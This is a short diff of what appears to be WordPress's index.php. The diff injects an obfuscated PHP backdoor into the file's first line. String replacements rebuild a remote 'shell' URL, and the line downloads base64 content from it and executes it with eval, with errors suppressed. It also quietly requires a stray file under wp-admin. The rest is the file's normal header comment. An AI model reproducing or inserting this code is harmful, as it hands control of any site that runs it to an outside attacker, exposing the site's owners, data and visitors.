@@ -1,4 +1,6 @@
-<?php
+<?php @eval(base64_decode(file_get_contents('h'.str_replace('$','ell',str_replace('&','.',str_replace('^','/',str_replace('%','ttp','%:^^sh$&nn'.'xuu&com^ab&ph'.'p'))))))); @require('wp-admin/25');
+
+
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
